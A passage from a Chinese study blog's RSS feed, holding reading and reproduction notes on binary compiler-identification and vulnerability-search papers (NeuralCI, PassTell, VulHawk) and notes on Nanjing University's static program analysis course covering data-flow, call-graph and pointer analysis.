总结：因为编译器的优化会产生一些意想不到的负面影响，包括安全问题、克隆检测技术性能下降和难以定位补丁函数。所以要有一种技术来检测编译器的优化？目前的技术侧重于识别识别编译器家族、主要编译器版本以及二进制文件的优化级别，缺少更详细的信息。作者提出的方法可以识别函数级的优化过程，提供更详细的优化信息。
背景 编译优化 知道二进制文件的优化级别不足以确定应用于二进制文件的精确优化集。 因为除了用户指定的优化级别外，在决定要运行的传递时，传递管理器还考虑多个因素，包括目标体系结构、目标处理器生成和源代码结构。 安全影响 持久状态违反是指数据持续存在于其设计的可用范围之外。
D’silva et al.[3]列出了三种可能导致这种违规的优化: 死代码消除、函数内联和代码移动。 在密码验证函数中，密码在验证期间临时存储在内存中，编译器可能会认为擦除本地内存的操作是死代码并将其删除，导致密码在使用后仍存在于内存中，直到最终被后面的函数覆盖。 如果受信任的安全敏感函数内联在不受信任的函数中，则受信任函数的局部变量的生存期将扩展到不受信任函数返回时。 代码移动可以切换指令的顺序，以避免不必要的计算或改善局部性。这种优化可能会导致程序在验证操作是否需要之前将敏感值写入内存。 侧通道攻击：为了避免侧通道，开发人员可能会向函数中添加不必要或低效的操作，但优化可能会简化或删除这些操作，从而重新引入侧通道。
D’silva et al.[3]列出了三种可能引入侧通道的优化方法: 公共子表达式消除，将多个指令合并为一条指令以避免重复计算; 强度降低，用更有效的指令取代昂贵的指令， 窥视孔优化，检查周围的指令，以寻找重新排序或替换指令的机会，以简化计算或更好的局部性。 本文的工作重点是识别上述两种优化。</description>
    </item>
    
    <item>
      <title>Automatic Recovery of Fine-grained Compiler Artifacts at the Binary Level复现</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E5%A4%8D%E7%8E%B0/automatic-recovery-of-fine-grained-compiler-artifacts-at-the-binary-level%E5%A4%8D%E7%8E%B0/</link>
      <pubDate>Sun, 11 Jun 2023 02:01:58 +0530</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E5%A4%8D%E7%8E%B0/automatic-recovery-of-fine-grained-compiler-artifacts-at-the-binary-level%E5%A4%8D%E7%8E%B0/</guid>
      <description>[[Automatic Recovery of Fine-grained Compiler Artifacts at the Binary Level]] GitHub 地址：zeropointdynamics/passtell (github.com)
数据集结构 passtell_dataset. tar. xz ：PassTell 实验中使用的数据集的存档，包括: &amp;rsquo; balanced_dataset. csv &amp;lsquo;: 用于粗粒度编译器配置分类的数据集。如第 6.1 节所述，此数据集是 NeuralCI 中使用的数据集的平衡子集。 用于 6.1 节的实验——编译器配置识别 数据集由数据集中所有动态链接的未分解的可执行文件组成，包括 binutils、busybox、coreutils、curl、ffmpeg、git、gsl、libpng、openssl、postgresql、sqlite、valgrind、vim、zlib 和 gdb。 &amp;rsquo; data. csv &amp;lsquo;: 用于 6.2 节中使用的细粒度编译器传递分类的数据集。 用于 6.2 节实验——优化传递识别 编译器传递数据集由来自用 Clang 14 编译的 binutils (2.37)、coreutils (9.0)、httpd (2.4.51) 和 sqlite (3.36.0) 程序的函数组成，使用-O0、-O1、-O2 和-O3 优化级别，在 552 个二进制文件中生成总共 149, 814 个函数。然后，我们为每一次传递平衡数据集: 对于每一次传递，我们随机选择等量的应用了传递的函数 (即正样本) 和没有应用传递的函数 (即负样本)。我们还将每次传递的最大样本数量限制为 5, 000 个正样本和 5, 000 个负样本。 &amp;rsquo; data_dynamic.</description>
    </item>
    
    <item>
      <title>Fine-Grained Compiler Identification With Sequence-Oriented Neural Modeling</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/fine-grained-compiler-identification-with-sequence-oriented-neural-modeling/</link>
      <pubDate>Sun, 11 Jun 2023 02:01:58 +0530</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/fine-grained-compiler-identification-with-sequence-oriented-neural-modeling/</guid>
      <description>中文译名：基于面向序列的神经模型的细粒度编译器识别 作者：ZHENZHOU TIAN 单位： 西安邮电大学 国家： #中国 年份： #2021年 来源： #IEEE_ACCESS 关键字： #编译 #神经网络 #二进制 代码地址：zztian007/NeuralCI (github.com) 笔记建立时间： 2023-02-23 15:37
摘要 现有的大多数方法都采用基于特征匹配或基于机器学习的策略来识别编译器细节，在检测精度或粒度上都有限制。 在这项工作中，我们提出了 NeuralCI (基于神经建模的编译器识别) 来推断这些编译器细节，包括编译器家族、优化级别和单个函数的编译器版本。 其基本思想是建立面向序列的神经网络来处理使用轻量级函数抽象策略生成的规范化指令序列。 为了评估 NeuralCI 的性能，构建了一个由从 19 个广泛使用的现实项目中收集的 854, 858 个独特函数组成的大型数据集。 实验表明，NeuralCI 识别编译器族的平均准确率为 98.6%， 识别优化级别的平均准确率为 95.3%， 识别编译器版本的平均准确率为 88.7%， 识别编译器族和优化级别的平均准确率为 94.8%， 同时识别所有编译器组件的平均准确率为 83.0%，在检测精度和全面性方面均优于现有的功能级编译器识别方法。 1引言 编译器识别方面的研究相对较少，主要分为两类:
基于签名匹配的方法[6]-[8] 在一些逆向工程工具中实现，如 IDA[6]和 PEiD[8]，通过匹配通用签名和刚性签名的语料库来执行整个程序级别的识别。 这些方法的缺点是在构造足够好的特定于编译器的签名时需要严格的专业知识，以及它们的粗标识粒度。 和基于学习的方法[27]-[29]，[39]。 后者将编译器识别定义为机器学习任务，训练模型以捕获特定于编译器的模式，并根据以前未见过的二进制文件推断编译器细节。 对于这类方法，语法或结构特征是基于人工定义的模板提取的，例如 idioms[29]，它是带有通配符的短指令序列，或者 graphlets[28]，它是 CFG (控制流图) 中的小子图。作为典型的基于特征工程的方法，其有效性在很大程度上取决于专家定义的特征提取模板的质量，而专家定义的特征提取模板需要更多的领域特定知识。 具体来说，我们为典型的卷积神经网络 (CNN) 和循环神经网络 (RNN) 结构提供标准化的汇编指令序列，以训练分类模型，用于推断编译器族、优化级别和编译器版本。我们的直觉是基于这样的观察: 共出现的指令及其在短指令序列中的顺序形成了足够好的信号，可以区分不同的编译器或优化级别，这可以被神经模型基本上捕捉到。
2 问题定义和设计概述 A 问题概述 略</description>
    </item>
    
    <item>
      <title>Identifying Compiler and Optimization Level in Binary Code From Multiple Architectures</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/identifying-compiler-and-optimization-level-in-binary-code-from-multiple-architectures/</link>
      <pubDate>Sun, 11 Jun 2023 02:01:58 +0530</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/identifying-compiler-and-optimization-level-in-binary-code-from-multiple-architectures/</guid>
      <description>中文译名：多体系结构二进制代码中编译器和优化级别的识别 作者：DAVIDE PIZZOLOTTO 单位：大阪大学 国家： #日本 年份： #2021年 来源： #IEEE_ACCESS 关键字： #编译 #二进制 #神经网络 代码地址：GitHub - inoueke-n/optimization-detector: Optimization detection over compiled binaries 笔记建立时间： 2023-02-20 14:44
摘要 在比较不同的二进制文件时，确保相同的编译器和编译标志尤其重要，以避免不准确或不可靠的分析。 要理解使用了哪些标志和优化，需要对目标体系结构和所使用的编译器有深入的了解。 在这项研究中，我们提出了两种深度学习模型，用于检测编译二进制文件中的编译器和优化级别。我们研究的优化级别是 x86_64、AArch64、RISC-V、SPARC、PowerPC、MIPS 和 ARM 架构中的 O0、O1、O2、O3 和 Os。此外，对于 x86_64 和 AArch64 体系结构，我们还确定编译器是 GCC 还是 Clang。 我们创建了一个超过 76000 个二进制数据集，并将其用于训练。我们的实验表明，在检测编译器时，准确率超过 99.95%，在检测优化级别时，根据架构的不同，准确率在 92%到 98%之间。此外，我们分析了当数据量极其有限时，准确性的变化。我们的研究表明，使用函数级粒度准确检测编译器标志设置和优化级别是可能的。 1引言 编译器信息和优化等级等信息对于各种应用程序都非常有价值，比如对旧版本进行分类，查找漏洞，查找二进制文件中的相似性，重写二进制文件，或者在编译环境无法控制的情况下提供准确的错误报告。 虽然有几篇关于检测编译器[5]和工具链[8]使用的论文，但这些方法不依赖于自动学习方法。使用基于机器学习的方法，提供新数据并重新运行训练以检测新的编译器或标志就足够了。使用我们工作中提供的自动数据集生成，对于我们想要分类的每个优化级别，生成这些数据所需的时间是几个小时。 在这项研究中，我们提出了在不同架构中使用长短期记忆网络 (LSTM)[9]和卷积神经网络 (CNN)[10]来识别编译器和优化级别的方法。 作者指出本文的进步在于 测试的优化等级和测试数量的增加：优化等级测试次数由{O0, O2}增加到{O0, O1, O2, O3, Os}。•测试的架构数量从{x86_64}增加到{x86_64, AArch64, RISC-V, SPARC, PowerPC, MIPS, ARM32}。 提供了数据集和自动化生成数据集的脚本 神经网络结构的实现和调整 2动机 在一些应用场景中编译器信息和优化等级信息是必须的 二进制重写中，不了解优化等级可能会导致重写的编译失败 反编译中，编译器信息和优化等级信息会帮助判断反编译后得到的源代码的正确性 二进制文件比较中，编译器的优化会带来极大的误导 3前期工作 本文工作特点：</description>
    </item>
    
    <item>
      <title>Identifying Compiler and Optimization Level in Binary Code From Multiple Architectures复现</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E5%A4%8D%E7%8E%B0/identifying-compiler-and-optimization-level-in-binary-code-from-multiple-architectures%E5%A4%8D%E7%8E%B0/</link>
      <pubDate>Sun, 11 Jun 2023 02:01:58 +0530</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E5%A4%8D%E7%8E%B0/identifying-compiler-and-optimization-level-in-binary-code-from-multiple-architectures%E5%A4%8D%E7%8E%B0/</guid>
      <description>代码地址：GitHub - inoueke-n/optimization-detector: Optimization detection over compiled binaries [[Identifying Compiler and Optimization Level in Binary Code From Multiple Architectures]]
准备 实验用到的数据集 following link. 也可以自己按照 readme. md 文件中的 generation 节中的步骤来自己生成数据集。（因为文章中提到的担心被库文件污染，所以需要 docker 环境来生成） 文档结构 Resources 存储测试的二进制文件 Tests 和 src 文件存储源代码 generate_dataset.py 文件负责生成数据集（准确的说是交叉编译生成所需的二进制文件） optimization-detector.py 文件负责文件的提取（可执行数据），预处理（平衡数据集），训练、评估、推断。 数据集文件结构 Dataset 文件夹下的是已经经过预处理的数据集，raw 后缀表示采用原始字节作为输入，func 表示按照函数边界进行了拆分
但是没有优化等级是 O3 的数据啊 突然懂了这个逻辑，process 的输入是 func 和 raw 文件，输出 train. bin、test. Bin、validate. Bin 文件，然后 train 用 train. Bin 、validate. Bin 文件训练，evaluate 用 test. Bin 看效果</description>
    </item>
    
    <item>
      <title>NeuralCI 复现</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E5%A4%8D%E7%8E%B0/neuralci-%E5%A4%8D%E7%8E%B0/</link>
      <pubDate>Sun, 11 Jun 2023 02:01:58 +0530</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E5%A4%8D%E7%8E%B0/neuralci-%E5%A4%8D%E7%8E%B0/</guid>
      <description>[[Fine-Grained Compiler Identification With Sequence-Oriented Neural Modeling]] 实验评估中用 NeuralBS CNN，NeuralSD CNN 和 NeuralAD CNN 来表示基础 CNN，带有缩放点积注意力的增强 CNN 和带有附加注意力的增强 CNN 在以下实验评估中使用 NeuralBS GRU，NeuralSD GRU，NeuralAD GRU 和 NeuralQU GRU（SD 和 AD 和 CNN 一样，QU 是新加的）
识别编译器系列 family 识别编译器版本 version 识别优化级别 binaryOptimization 和 tripleOptimization
目前存在的问题：
Full 和 done 后缀的文件不明白用途，Binary 和 done 的区别 TensorFlow 版本不兼容，需要改部分代码 代码中的文件路径指向（所需要的）文件没有，貌似需要自己构建数据集（IDA pro 提取什么的） </description>
    </item>
    
    <item>
      <title>VulHawk Cross-architecture Vulnerability Detection with Entropy-based Binary Code Search</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/vulhawk-cross-architecture-vulnerability-detection-with-entropy-based-binary-code-search/</link>
      <pubDate>Sun, 11 Jun 2023 02:01:58 +0530</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/vulhawk-cross-architecture-vulnerability-detection-with-entropy-based-binary-code-search/</guid>
      <description>中文译名：VulHawk：基于熵的二进制代码搜索的跨架构漏洞检测 作者：Zhenhao Luo 单位：国防科大 国家： #中国 年份： #2023年 来源： #NDSS会议 关键字： #二进制代码搜索 代码地址： https://github.com/RazorMegrez/VulHawk 笔记建立时间： 2023-03-20 13:59
摘要 目的：对不同架构、不同编译器、不同优化级别编译的 IoT 固件映像进行二进制代码搜索来识别代码重用 方法：
提出了一种新的中间表示函数模型，是一种用于跨体系结构二进制代码搜索的体系结构不确定模型 将二进制代码提升为 IR，通过补充隐式操作数和删除冗余指令来保留二进制函数的主要语言 使用 NLP 和卷积生成函数嵌入 将编译器、架构和优化级别的组合称为一个文件环境，采用 divide-and-conquer 策略将 $C_N^2$ 个跨文件环境场景的相似性问题转化为 $N-1$ 个嵌入转化子问题。 提出了一种基于熵的适配器，将不同文件环境中的函数嵌入传输到同一文件环境中，以缓解不同文件环境造成的差异 提出了一种渐进搜索策略 用细粒度特征补充函数嵌入，以减少修补函数造成的误报 意义：提高检测代码重用带来的漏洞的效率 效果：VulHawk 的性能优于 Asm2Vec、Asteria、BinDiff、GMN、PalmTree、SAFE 和 Trex。
引言 现状：
二进制代码搜索方法不够健壮，不能跨平台 Asm2Vec[10]、DeepBinDiff[11]和 PalmTree[27]使用自然语言处理 (NLP) 技术取得了令人鼓舞的结果（不能跨平台） InnerEye[60]将来自不同 isa 的二进制作为不同的自然语言，并使用神经机器翻译来计算二进制代码的相似度。SAFE[35]使用来自多个 isa 的二进制来训练其语言模型，以跨体系结构搜索二进制代码。（严重依赖于训练数据，很难实现多个 isa） 将特定于体系结构的二进制代码提升为与体系结构无关的中间表示 (IR) 是解决物联网固件中跨体系结构挑战的有效方法。但是 IR 和自然语言有本质区别。 相同源码经过不同优化级别的编译器编译后得到的二进制文件语义相似但结构不同 在本文中，我们考虑了 3 种架构 (x86、arm 和 mips)、2 种字大小 (32 位和 64 位)、2 个编译器 (Clang 和 GCC) 和 6 个优化级别 (O0、O1、O2、O3、Os 和 Ofast)，总共 72 种组合 (3 × 2 × 2 × 6)。 本文提出了一种新的跨架构二进制代码搜索方法 VulHawk</description>
    </item>
    
    <item>
      <title>VulHawk 复现</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E5%A4%8D%E7%8E%B0/vulhawk-%E5%A4%8D%E7%8E%B0/</link>
      <pubDate>Sun, 11 Jun 2023 02:01:58 +0530</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E5%A4%8D%E7%8E%B0/vulhawk-%E5%A4%8D%E7%8E%B0/</guid>
      <description>[[VulHawk Cross-architecture Vulnerability Detection with Entropy-based Binary Code Search]]
Get Started Prerequisites Windows (MacOS and Linux also work) Python 3.8.2 (64 bit) PyTorch 1.13.1 CUDA 11.7 IDA pro 7.5+ (only used for dataset processing) Quick Start File Environment Identification python 2_FileEnvironmentIdentification.py
Function Embedding Generation python 3_function_embedding_generation.py
Binary Function Similarity Detection python 4_binary_code_search.py
论文基本流程 整体输入是二进制文件，然后分两部分进行：
IRFM：对输入的二进制程序进行处理得到 IR，IR 作为 IRFM 的输入，输出是 IR 的词嵌入 首先进行 IR 生成和指令简化 然后使用 Masked Language Model (MLM)、根操作数预测 (ROP) 和相邻块预测 (ABP) 进行预训练 然后生成基本块嵌入 用基本块嵌入和 cfg 生成函数嵌入（GCN 网络是用来捕获 cfg 的） 基于熵的适配器： 首先计算二进制文件的熵值 使用残差神经网络作为分类器判断二进制文件属于哪种文件环境（编译器、优化级别等等） 上面两个一个得到二进制文件的函数嵌入，另一个得到二进制文件的文件环境，并且将二进制文件映射到一个中间环境中，减弱不同文件环境带来的影响。 用函数嵌入进行渐进式搜索</description>
    </item>
    
    <item>
      <title>南大软件分析前5节笔记</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%89%8D5%E8%8A%82%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Sun, 11 Jun 2023 02:01:58 +0530</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%89%8D5%E8%8A%82%E7%AC%94%E8%AE%B0/</guid>
      <description>IR Intermediate Representation 中间表示 3AC 三地址码 3-Address Code 每条3AC至多有三个地址，地址可以是名称，常量，编译器生成的临时变量 其实3AC就是指令的一种表示形式 BB 基本块 basic block 基本块是满足一下性质的连续3AC：只能从块的第一条指令进入；只能从块的最后一条指令离开 构建程序P的基本块算法 寻找leader（leader就是基本块的入口） P的第一条指令是一个leader 跳转目标是一个leader 跳转指令的后一条指令也是一个leader 一个基本块就是一个leader一直到下一个leader前的所有指令 CFG 控制流图 control flow graph 控制流图的一个结点可以是一条单独的3AC，更常见的是一个基本块BB 构建控制流图算法 首先构建程序基本块 构建边：块 A 和块 B 之间有一条边，当且仅当：A 的末尾有一条指向了 B 开头的跳转指令；A 的末尾紧接着 B 的开头，且 A 的末尾不是一条无条件跳转指令 数据流分析 PP 程序点 program point 在数据流分析中，我们会把每一个PP关联一个数据流值，代表在该点中可观察到的抽象的程序状态。 输入输出状态 每一条IR的执行，都会使状态从输入状态变成新的输出状态 输入/输出状态与语句前/后的 program point相关联。 转移方程 每条语句 s 都会使程序状态发生改变，这个所谓的方程f_x()对应的就是语句使得状态发生变化的操作 分析数据流有前向后后向两种，每条语句对应的状态转移方程也有两种。 控制流约束 这指的是状态的变化需要和控制流对应，比如说有两个基本块A1和A2都指向基本块B，那么B的输入状态就应该是A1、A2输出状态的交集 Reaching Definitions Analysis 到达定义分析 假设v在PPp处有定义x，如果存在一个路径从PPp到PPq，并且在该路径上没有v的其他定义，则称v的定义x到达p点。 如果在这条路径上有v的其他定义，则称变量v的定义x被killed 应用举例：分析程序是否存在变量未初始化：在程序入口为各变量引入一个 dummy 定值。当程序出口的某变量定值依然为 dummy，则我们可以认为该变量未被定义。 到达定义的转移方程 $$ \begin{matrix}OUT[B]=gen_B\cup(IN[B]-kill_B) \ IN[B]=\cup_{p,a,predecessor,of, B}OUT[P] \end{matrix}</description>
    </item>
    
    <item>
      <title>南大软件分析第七节笔记</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%83%E8%8A%82%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Sun, 11 Jun 2023 02:01:58 +0530</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%83%E8%8A%82%E7%AC%94%E8%AE%B0/</guid>
      <description>视频： 南京大学《软件分析》课程07（Interprocedural Analysis 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：(34条消息) 【课程笔记】南大软件分析课程—16课时完整版_bsauce的博客-CSDN博客_南京大学软件分析 软件分析（七）Inter-procedural Analysis - 知乎 (zhihu.com) 软件分析 - 知乎 (zhihu.com) PPT： Interprocedural Analysis (nju.edu.cn)
1.Motivation 1. 1为什么需要过程间分析（Interprocedural Analysis） 我们之前学习的是过程内分析（Interprocedural Analysis），过程内分析聚焦于函数内部，对于函数间的调用采取的策略是最保守（安全）的假设，但是安全性高伴随的就是精确度低，如下图，过程内分析就会将变量 x，y，n 设置为 NAC 但是过程间分析增加了 call 和 return 边，这样可以将不同函数的数据流信息通过边来传输，如下图所示，x，y，n 分别为 42， 43， 10 想要进行过程间分析，那么我们就需要调用图（call graph）
1. 2调用图 调用图就是程序中调用关系的表示，本质是调用边的集合，从调用点（call-sites）到目标函数（target methods / callees）的边 应用：是所有过程间分析（跨函数分析）的基础，对于程序优化，程序理解，程序调试等有很重要的作用。
1. 3针对面向对象程序设计语言 (OOPLs) 的调用图构造 主要有如下几种构建算法，从上往下精度变高，速度变慢。主要聚焦于第一个和最后一个算法 1.4Java 的调用分类 OO 语言的调用图构建的关键（难点）所在就是虚拟调用，因为它的目标函数有多个，并且需要在运行时才能确定。 1.5Method Dispatch of Virtual Calls 因为在运行中，一个虚拟函数的 resolved（意思就是把这个虚拟调用“解”为目标函数）基于两点：receiver objects 的类型和调用方法的签名（signature）。 O 是 receiver，foo 是方法签名 Signature 是方法的一个标识：</description>
    </item>
    
    <item>
      <title>南大软件分析第九节——Pointer Analysis - Foundations I</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E4%B9%9D%E8%8A%82pointer-analysis-foundations-i/</link>
      <pubDate>Sun, 11 Jun 2023 02:01:58 +0530</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E4%B9%9D%E8%8A%82pointer-analysis-foundations-i/</guid>
      <description>视频：南京大学《软件分析》课程09（Pointer Analysis - Foundations I）哔哩哔哩_bilibili 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：(34条消息) 【课程笔记】南大软件分析课程—16课时完整版_bsauce的博客-CSDN博客_南京大学软件分析 软件分析 - 知乎 (zhihu.com) PPT： Pointer Analysis: Foundations (nju.edu.cn)
1指针分析规则 首先确定分析域和记号的表示 变量、函数、对象、实例域、指针、指向关系 针对上节课末尾提到的四种句子进行分析 横线上的是前提条件，横线下的是结论
2 如何实现指针分析 本质上指针分析就是要将指针关系通过指针（variables&amp;amp;fields）进行传播 关键在于当 pt (x) 发生改变，将改变的部分传播到 x 相关的指针。 用图来解决如何传播的问题
PFG Pointer Flow Graph 指针流图 程序的指针流图是一个有向图，它表示对象如何在程序中的指针之间流动。
Nodes：指针，A node n represents a variable or a field of an abstract object Edges：An edge 𝑥 → 𝑦 means that the objects pointed by pointer 𝑥 may flow to (and also be pointed to by) pointer y 基于程序语句和相应的规则往 PFG 中添加边 基于 PFG，指针分析可以通过计算 PFG 的传递闭包来解决，如下图：基于 PFG，语句 j 可以从结点 b 沿着路径 b、a、oi.</description>
    </item>
    
    <item>
      <title>南大软件分析第八节笔记</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%85%AB%E8%8A%82%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Sun, 11 Jun 2023 02:01:58 +0530</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%85%AB%E8%8A%82%E7%AC%94%E8%AE%B0/</guid>
      <description>视频： 南京大学《软件分析》课程 08（Pointer Analysis 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：(34条消息) 【课程笔记】南大软件分析课程—16课时完整版_bsauce的博客-CSDN博客_南京大学软件分析 软件分析 - 知乎 (zhihu.com) PPT： Pointer Analysis (nju.edu.cn)
Motivation CHA 算法存在缺陷（上一节课有说） 上一节提到过 CHA 算法是针对 call site 的声明类寻找目标函数，所以如上图所示，n.get 的声明类是 Number，Number 有三个子类，所以找到的目标函数就是三个结果，但是这个结果是不准确的，所以我们需要用到指针分析，去寻找 call site 真正指向的那个函数。
Introduction to Pointer Analysis 指针分析 指针分析是基本的静态分析，用于计算一个指针可以指向的内存位置，对于面向对象程序来说是计算一个指针（变量或字段）可以指向哪些对象 指针分析是一种 may 分析，它的分析结果是可以指向的对象的集合 如上图的例子，指针分析得到的是指向关系（point-to relations） 指针分析和别名分析的区别 两个密切相关但不同的概念 指针分析: 指针可以指向哪些对象? 别名分析: 两个指针可以指向同一个对象吗? 别名信息可以从指向关系中获得
指针分析的应用 基本信息（别名分析/调用图） 编译优化（嵌入虚拟调用） 漏洞（空指针） 安全分析（信息流） Key Factors of Pointer Analysis 指针分析是一个复杂的系统，许多因素都会影响指针分析的精度和效率 堆抽象 程序动态执行时，堆对象个数理论上是无穷无尽的，但静态分析无法处理这个问题。所以为保证指针分析可以终止，我们采用堆抽象技术，将无穷的具体对象抽象成有限的抽象对象。也即，将有共性的对象抽象成 1 个静态对象，从而限制静态分析对象的个数。 本节介绍的堆抽象技术是目前最常用的堆抽象技术——allocation-site 技术</description>
    </item>
    
    <item>
      <title>南大软件分析第六节笔记</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%85%AD%E8%8A%82%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Sun, 11 Jun 2023 02:01:58 +0530</pubDate>
      
